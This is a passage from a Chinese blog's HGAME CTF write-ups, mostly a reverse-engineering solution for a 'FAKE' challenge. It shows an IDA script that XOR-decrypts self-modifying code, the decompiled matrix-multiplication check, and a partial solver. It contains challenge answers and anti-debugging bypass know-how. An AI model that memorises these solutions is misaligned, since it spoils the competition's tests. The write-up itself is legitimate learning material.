punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">80</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">[</span><span class="token number">79</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>tables<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>tables<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>answer<span class="token punctuation">[</span><span class="token number">79</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>这一段输出已经加密的比特流。</p>
<pre class="line-numbers language-none"><code class="language-none">08 bc 48 bf 48 e7 ff 28 66 22 84 9c 74 f5 f2 66 0a 81 c0 65 dd 0f c7 a4 fa be c2 0f a4 d2 bd 81 57 b6 2c c0 be e7 98 64 22 c6 1b 76 ad 93 3f 8a 20 5b b6 a3 01 87 35 87 05 a9 fa dd e4 51 7f bd a9 86 c1 e7 8b 03 94 6a 0e 49 92 fc 80 12 bb 92  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>然后再复制到 block 中 修改标志位，再解密！</p>
<p>result</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/result.png" alt="result"></p>
<p>大胜利，好耶。</p>
<p>真的学些了好多，尤其是 lua 的源代码，可读性超强。</p>
<p>不过有一些还不明白，怎么做到把这个 lua 虚拟机移植到程序内的，这个很有意思。应该还有别的做法，比如 hook 函数什么的，不过我还不清楚那些，或者说遇到了我也用别的方法解决了。</p>
<p>不过最后最后，我感觉最重要的应该还是怎么制作出这个程序，真的很惊艳。太妙了，一道题让我学习了一门语言外加一些骚操作。</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK3_WP</title>
    <url>/2021/03/14/HGAME_WEEK3_WP/</url>
    <content><![CDATA[<h2 id="WEEK3-RogerThat-WP"><a href="#WEEK3-RogerThat-WP" class="headerlink" title="WEEK3-RogerThat WP"></a>WEEK3-RogerThat WP</h2><p>萎了萎了，没时间做pwn了(游戏玩多了)</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h4 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h4><p>乱打一通，拿了一个假flag,没注意到init函数对调试器操作了一波。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QQ%E6%88%AA%E5%9B%BE20210214025343.jpg" alt="QQ截图20210214025343"></p>
<p>这里应该是检测了是否有debugger，通过文件系统来达成，在windows中估计就是IsDebugger了，也可能有别的骚操作，暂且没见着，大胆猜测可以有多进程通信检测什么的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/FAKE2.jpg" alt="2"></p>
<p>针对这个比较简单的加密函数有脚本</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;idc.idc></span></span>

<span class="token keyword">static</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> addr <span class="token operator">=</span> <span class="token number">0x401216</span><span class="token punctuation">;</span>
    <span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">0x43E</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token function">Byte</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">Byte</span><span class="token punctuation">(</span><span class="token number">0x409080</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>解密后得到真正的比较函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_401216</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-1D0h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-140h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+128h] [rbp-B0h] BYREF</span>
  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C0h] [rbp-18h]</span>
  <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C4h] [rbp-14h]</span>
  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C8h] [rbp-10h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+1CCh] [rbp-Ch]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D0h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp-4h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55030</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61095</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">60151</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57247</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56780</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55726</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46642</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52931</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">53580</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50437</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50062</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44186</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44909</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46490</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46024</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44347</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">43850</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44368</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54990</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61884</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61202</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">58139</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57730</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54964</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48849</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51026</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49629</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48219</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47904</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50823</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46596</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50517</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48421</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46143</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46102</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46744</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">70</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
        v4<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">+=</span> v2<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> k <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> i <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> l <span class="token operator">+</span> m<span class="token punctuation">]</span> <span class="token operator">!=</span> v3<span class="token punctuation">[</span><span class="token number">6</span> <span class="token operator">*</span> l <span class="token operator">+</span> m<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v10<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>而假的函数却也像真的一样，要是解析不出来数据段嘛，那我倒是会先去想SMC，这点看真的是非常巧妙！！！后来仔细想了一下，应该是encrypt(f1(x)) &#x3D;&#x3D; f2(2),只要满足能转换f1和f2，任何加密方式都可以。而异或恰恰是比较简单方便的加密方式。</p>
<p>基本是同一穿代码，异或以下（加密以下）能性成一种看似很像真代码的代码。</p>
<p>最后经过一些探索，发现是一个线性的加密，矩阵乘法。因此得到解密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

v2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">36</span>
v3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">36</span>

v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55030</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61095</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">60151</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57247</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56780</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55726</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46642</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52931</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">53580</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50437</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50062</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44186</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44909</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46490</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46024</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44347</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">43850</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44368</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54990</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61884</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61202</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">58139</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57730</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54964</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48849</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51026</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49629</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48219</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47904</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50823</span><span class="token punctuation">;</span>
v3<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46596</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50517</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48421</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46143</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46102</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46744</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
